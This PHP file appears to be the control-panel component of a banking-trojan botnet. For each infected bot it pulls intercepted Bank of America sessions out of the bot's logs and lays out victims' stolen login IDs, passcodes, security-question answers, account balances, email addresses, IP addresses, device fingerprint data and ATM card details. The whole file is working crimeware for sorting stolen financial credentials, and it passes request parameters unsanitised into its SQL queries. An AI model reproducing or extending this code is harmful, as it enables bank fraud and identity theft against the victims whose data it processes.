<style type="text/css">
a:hover {background:#ffffff; text-decoration:none;} /*BG color is a must for IE6*/
a.tooltip span {display:none; padding:2px 3px; margin-left:8px; width:130px;}
a.tooltip:hover span{display:inline; position:absolute; background:#ffffff; border:1px solid #cccccc; color:#6c6c6c;}
</style>

<?php

set_time_limit(0);

include('php/simple_html_dom.php');

// ---

$banklink = 'bankofamerica.com';

// ---

function drawItem($var, $val)
{
	echo "<tr style=' background-color: #e7f2f6; '>";
	echo "<td colspan='2'>";
	echo "<b>$var</b> : $val";
	echo "</td>";
	echo '</tr>';
}

// ---

$bot_guid = urldecode($_GET['bot_guid']);
if (@$bot_guid && $bot_guid) {
	$sqlp1 = " AND bot_guid LIKE '%$bot_guid%'";
}
$date = $_GET['dt'];
if (!@$date)
	exit;
$limit = $_GET['lm'];
if ((@$limit) && $limit) {
	$sqlp0 = " LIMIT $limit";
}
$showDates = $_GET['showDates'];

require_once 'mod_dbase.php';
require_once 'mod_strenc.php';
require_once 'mod_file.php';

$dbase = db_open();

// Getting number of accounts

$unimain = "%$banklink%Access_ID%";

$sql = "SELECT DISTINCT bot_guid "
     . "  FROM rep2_$date"
	 . " WHERE 1 = 1"
	 . "   AND func_data LIKE '$unimain'"
	 . $sqlp1
	 . $sqlp0;
$res = mysqli_query($dbase, $sql);
if ((!(@($res))) || !mysqli_num_rows($res)) {
	echo "No <b>BOA accounts</b> were found";
	exit;
}
//echo " <br><br> { $sql } <br><br> ";
$cnt = mysqli_num_rows($res);
while ( list($boa_bot_guid) = mysqli_fetch_row($res) ) {

//echo " <br><br> { <b>$boa_bot_guid</b> } <br><br> ";
//echo " <br><br> { $sql } <br><br> ";

echo "<table width='730' border='1' cellspacing='0' cellpadding='3' style='border: 1px solid #BBBBBB; font-size: 9px; border-collapse: collapse; background-color: #4992a7;'>";
echo "<th style=' color: #EEEEEE;'>id</th>";
echo "<th style=' color: #EEEEEE;'>bot_guid</th>";
echo "<tr><td colspan='2'></td></tr>";
echo "<tr align='center' valign='middle' style=' background-color: #cce7ef; '>";
$ucodebot = urlencode($boa_bot_guid);
// onclick=\"GB_show('Detail info for selected bot', '../../frm_bot.php?guid=$ucodebot', 300, 600); return false;\"
echo "<td><a href='frm_bot.php?guid=$ucodebot' target='_blank'><img border='0' src='img/info.png' title='$id'></a></td>";
echo "<td>$boa_bot_guid</td>";
echo '</tr>';

// Access_ID
$sql = "SELECT DISTINCT LEFT( RIGHT(func_data, (LENGTH(func_data) - INSTR(func_data, 'Access_ID=')) - 9), INSTR( RIGHT(func_data, (LENGTH(func_data) - INSTR(func_data, 'Access_ID=')) - 9), '&' ) - 1 ) as szData"
     . "  FROM rep2_$date"
	 . " WHERE bot_guid = '$boa_bot_guid'"
	 . "   AND func_data LIKE '$unimain'"
	 . " ORDER BY szData ASC";
$res2 = mysqli_query($dbase, $sql);
if ((!(@($res2))) || !mysqli_num_rows($res2)) {
	drawItem('Access_ID', "<font class='error'>not found</font>");
	exit;
}
$cnt = mysqli_num_rows($res2);
for ($i = 0; $i < $cnt; $i++)
{
	list($Access_ID) = mysqli_fetch_row($res2);
	if (!strlen($Access_ID))
		continue;
	drawItem('Access_ID', urldecode($Access_ID));
}
// state
$sql = "SELECT DISTINCT LEFT( RIGHT(func_data, (LENGTH(func_data) - INSTR(func_data, '&state=')) - 6), INSTR( CONCAT(RIGHT(func_data, (LENGTH(func_data) - INSTR(func_data, '&state=')) - 6), CHAR(13)), CHAR(13)) - 1) as szData"
     . "  FROM rep2_$date"
	 . " WHERE bot_guid = '$boa_bot_guid'"
	 . "   AND func_data LIKE '%$banklink%&state=%'"
	 . " ORDER BY szData ASC";
$res2 = mysqli_query($dbase, $sql);
if ((!(@($res2))) || !mysqli_num_rows($res2)) {
	drawItem('state', "<font class='error'>not found</font>");
}
else {
$cnt = mysqli_num_rows($res2);
for ($i = 0; $i < $cnt; $i++)
{
	list($state) = mysqli_fetch_row($res2);
	if (strlen($state) != 2)
		continue;
	drawItem('state', $state);
}
}
// passcode
$sql = "SELECT DISTINCT LEFT( RIGHT(func_data, (LENGTH(func_data) - INSTR(func_data, '&passcode=')) - 9), INSTR( CONCAT(RIGHT(func_data, (LENGTH(func_data) - INSTR(func_data, '&passcode=')) - 9), CHAR(13)), CHAR(13)) - 1) as szData"
     . "  FROM rep2_$date"
	 . " WHERE bot_guid = '$boa_bot_guid'"
	 . "   AND func_data LIKE '%$banklink%&passcode=%'"
	 . " ORDER BY szData ASC";
$res2 = mysqli_query($dbase, $sql);
if ((!(@($res2))) || !mysqli_num_rows($res2)) {
	drawItem('passcode', "<font class='error'>not found</font>");
}
else {
$cnt = mysqli_num_rows($res2);
for ($i = 0; $i < $cnt; $i++)
{
	list($passcode) = mysqli_fetch_row($res2);
	if (!strlen($passcode))
		continue;
	drawItem('passcode', urldecode($passcode));
}
}
// balance
$sql = "SELECT DISTINCT RIGHT( func_data, (LENGTH(func_data) - INSTR(func_data, 'BOA : Balance')) - 14 ) as szData"
     . "  FROM rep2_$date"
	 . " WHERE bot_guid = '$boa_bot_guid'"
	 . "   AND func_data LIKE '%$banklink%BOA : Balance%'"
	 . " ORDER BY szData ASC";
$res2 = mysqli_query($dbase, $sql);
if ((!(@($res2))) || !mysqli_num_rows($res2)) {
	drawItem('Balance', "<font class='error'>not found</font>");
}
else {
$cnt = mysqli_num_rows($res2);
$accusd = null;
for ($i = 0; $i < $cnt; $i++)
{
	list($balance) = mysqli_fetch_row($res2);
	if (!strlen($balance))
		continue;
	$html = str_get_html($balance);
	$acc = null;
	foreach($html->find('a') as $element)
		if (strpos(strtolower($element->href), 'action=account_detail') !== false || strpos($element->href, 'action=1001') !== false)
			$acc[] = trim($element->plaintext);
	$usd = null;
	foreach($html->find('span') as $element)
		if (strpos($element->plaintext, '$') !== false && strpos($element->class, 'textneg') === false)
			$usd[] = trim($element->plaintext);
		
	for ( $i = 0; $i < count($acc); $i++ ) {
		$accusd[] = $acc[$i] . '; <b>' . $usd[$i] . '</b>';
	}
}
if ($accusd) {
$accusd = array_unique($accusd);
for ( $i = 0; $i < count($accusd); $i++ ) {
	drawItem('acc' . $i, $accusd[$i]);
}
drawItem('...', ' ?');
}
else {
	drawItem('Balance', "<font class='error'>not found</font>");
}
}
// controls
$sql = "SELECT DISTINCT RIGHT( func_data, (LENGTH(func_data) - INSTR(func_data, 'BOA : Account Type')) - 19 ) as szData"
     . "  FROM rep2_$date"
	 . " WHERE bot_guid = '$boa_bot_guid'"
	 . "   AND func_data LIKE '%$banklink%BOA : Account Type%'"
	 . " ORDER BY szData ASC";
$res2 = mysqli_query($dbase, $sql);
if ((!(@($res2))) || !mysqli_num_rows($res2)) {
	drawItem('controls', "<font class='error'>not found</font>");
}
else {
$cnt = mysqli_num_rows($res2);
$arescnt = null;
for ($i = 0; $i < $cnt; $i++)
{
	list($controls) = mysqli_fetch_row($res2);
	if (!strlen($controls))
		continue;
	$html = str_get_html($controls);
	$acnt = null;
	foreach($html->find('a') as $element)
		if (strlen($element->plaintext))
			$acnt[] = trim($element->plaintext);
	$str = '';
	for ( $i = 0; $i < count($acnt); $i++ ) {
		if ( strpos($acnt[$i], '</table>') !== false )
			continue;
		$str .= $acnt[$i];
		if ( $i + 1 != count($acnt) )
			$str .= '; ';
	}
	if (count($acnt))
		$arescnt[] = $str;
}
$arescnt = array_unique($arescnt);
for ( $i = 0; $i < count($arescnt); $i++ ) {
	drawItem('controls', $arescnt[$i]);
}
}
// email
$sql = "SELECT DISTINCT RIGHT( func_data, (LENGTH(func_data) - INSTR(func_data, 'BOA : EMAIL')) - 12 ) as szData"
     . "  FROM rep2_$date"
	 . " WHERE bot_guid = '$boa_bot_guid'"
	 . "   AND func_data LIKE '%$banklink%BOA : EMAIL%'"
	 . " ORDER BY szData ASC";
$res2 = mysqli_query($dbase, $sql);
if ((!(@($res2))) || !mysqli_num_rows($res2)) {
	drawItem('email', "<font class='error'>not found</font>");
}
else {
$cnt = mysqli_num_rows($res2);
for ($i = 0; $i < $cnt; $i++)
{
	list($email) = mysqli_fetch_row($res2);
	if (!strlen($email))
		continue;
	
	
	$pos = stripos($email, "<A ");
	if ($pos !== false)
		$email = substr($email, 0, $pos);

	$email = str_replace("<br>", "", $email);
	drawItem('email', $email);
}
}
// answers
$sql = "SELECT DISTINCT RIGHT( func_data, (LENGTH(func_data) - INSTR(func_data, 'BOA : Answers')) - 14 ) as szData"
     . "  FROM rep2_$date"
	 . " WHERE bot_guid = '$boa_bot_guid'"
	 . "   AND func_data LIKE '%$banklink%BOA : Answers%'"
	 . " ORDER BY szData ASC";
$res2 = mysqli_query($dbase, $sql);
if ((!(@($res2))) || !mysqli_num_rows($res2)) {
	drawItem('answers', "<font class='error'>not found</font>");
}
else {
$cnt = mysqli_num_rows($res2);
$qa = null;
for ($i = 0; $i < $cnt; $i++)
{
	list($answers) = mysqli_fetch_row($res2);
	if (!strlen($answers))
		continue;
	
	$html = str_get_html($answers);
	$q = null;
	foreach($html->find('option') as $element)
		if ($element->selected != null)
			$q[] = trim($element->plaintext);
	$a = null;
	foreach($html->find('input') as $element)
		if (strpos($element->name, 'securityKey') !== false)
			$a[] = trim($element->value);
		
	for ( $i = 0; $i < count($q); $i++ ) {
		if (!strlen($a[$i])) {
			$pos = strrpos($answers, "origAnswer='");
			if ($pos !== false) {
				$pos += strlen("origAnswer='");
				$pos2 = strpos($answers, "'", $pos);
				if ($pos2 !== false) {
					$a[$i] = substr($answers, $pos, $pos2 - $pos);
				}
			}
		}
		$qa[] = $q[$i] . '; <b>' . $a[$i] . '</b>';
	}
	
	//for ( $i = 0; $i < count($q); $i++ )
	//	drawItem('q' . $i, $q[$i]);
	//for ( $i = 0; $i < count($a); $i++ )
	//	drawItem('a' . $i, $a[$i]);
}
$qa = array_unique($qa);
for ( $i = 0; $i < count($qa); $i++ ) {
	drawItem('q&a' . $i, $qa[$i]);
}
}
// ip
$pos = strpos($boa_bot_guid, "!");
$boa_bot_guid2 = "SYSTEM" . substr($boa_bot_guid, $pos);
$sql = "SELECT DISTINCT ip as szData"
     . "  FROM rep1"
	 . " WHERE ( bot_guid = '$boa_bot_guid'"
	 . "    OR   bot_guid = '$boa_bot_guid2' )"
	 . " ORDER BY szData ASC";
$res2 = mysqli_query($dbase, $sql);
if ((!(@($res2))) || !mysqli_num_rows($res2)) {
	drawItem('ip', "<font class='error'>not found</font>");
}
else {
	$cnt = mysqli_num_rows($res2);
	$ipstr = '';
	for ($i = 0; $i < $cnt; $i++) {
		list($ip) = mysqli_fetch_row($res2);
		if (!strlen($ip))
			continue;
		$ipstr .= $ip;
		if ( $i + 1 != $cnt )
			$ipstr .= '; ';
	}
	drawItem('ip', $ipstr);
}
// User-Agent
$sql = "SELECT LEFT( RIGHT(func_data, (LENGTH(func_data) - INSTR(func_data, 'User-Agent: ')) - 11), INSTR( RIGHT(func_data, (LENGTH(func_data) - INSTR(func_data, 'User-Agent: ')) - 11), CHAR(10) ) - 1 )"
     . "  FROM rep2_$date"
	 . " WHERE bot_guid = '$boa_bot_guid'"
	 . "   AND func_data LIKE '%User-Agent: %' "
	 . "   AND func_data LIKE '$unimain'"
	 . " LIMIT 1";
$res2 = mysqli_query($dbase, $sql);
if ((!(@($res2))) || !mysqli_num_rows($res2)) {
	drawItem('User-Agent', "<font class='error'>not found</font>");
}
else {
	list($UserAgent) = mysqli_fetch_row($res2);
	drawItem('User-Agent', $UserAgent);
}
// PMData
$sql = "SELECT DISTINCT LEFT( RIGHT(func_data, (LENGTH(func_data) - INSTR(func_data, 'pmdata=')) - 6), INSTR( CONCAT(RIGHT(func_data, (LENGTH(func_data) - INSTR(func_data, 'pmdata=')) - 6), ';'), ';') - 1) as szData"
     . "  FROM rep2_$date"
	 . " WHERE bot_guid = '$boa_bot_guid'"
	 . "   AND func_data LIKE '%$banklink%pmdata=%'"
	 . " ORDER BY szData ASC";
$res2 = mysqli_query($dbase, $sql);
if ((!(@($res2))) || !mysqli_num_rows($res2)) {
	drawItem('pmdata', "<font class='error'>not found</font>");
}
else {
$cnt = mysqli_num_rows($res2);
for ($i = 0; $i < $cnt; $i++)
{
	list($pmdata) = mysqli_fetch_row($res2);
	if (!strlen($pmdata))
		continue;
		
	$pmdata_textarea = '<br><textarea readonly="" style="border-width: 1px; width: 600px; height: 33px; background-color: #F0FBFB; color: rgb(102, 102, 102);">' . $pmdata . '</textarea>';
	drawItem('pmdata', $pmdata_textarea);
		
	$pmdata_textarea = '<br><textarea readonly="" style="border-width: 1px; width: 600px; height: 33px; background-color: #F0FBFB; color: rgb(102, 102, 102);">' . urldecode($pmdata) . '</textarea>';
	drawItem('pmdata (urldecode)', $pmdata_textarea);
	
}
}
// ATM
$sql = "SELECT DISTINCT LEFT( RIGHT(func_data, (LENGTH(func_data) - INSTR(func_data, 'card=')) - 4), INSTR( CONCAT(RIGHT(func_data, (LENGTH(func_data) - INSTR(func_data, 'card=')) - 4), ';'), ';') - 1) as szData"
     . "  FROM rep2_$date"
	 . " WHERE bot_guid = '$boa_bot_guid'"
	 . "   AND func_data LIKE '%$banklink%card=%'"
	 . " ORDER BY szData ASC";
$res2 = mysqli_query($dbase, $sql);
if ((!(@($res2))) || !mysqli_num_rows($res2)) {
	drawItem('atm', "<font class='error'>not found</font>");
}
else {
$cnt = mysqli_num_rows($res2);
for ($i = 0; $i < $cnt; $i++)
{
	list($card) = mysqli_fetch_row($res2);
	if (!strlen($card))
		continue;
	
	$card = "card=" . str_replace('&', "; ", $card);
	drawItem('atm', $card);
}
}


echo "</table>\n";

//echo "<hr size=\"1\" color=\"#cccccc\">";
//echo "<br> {  $sql  } <br>";

}

db_close($dbase);

?>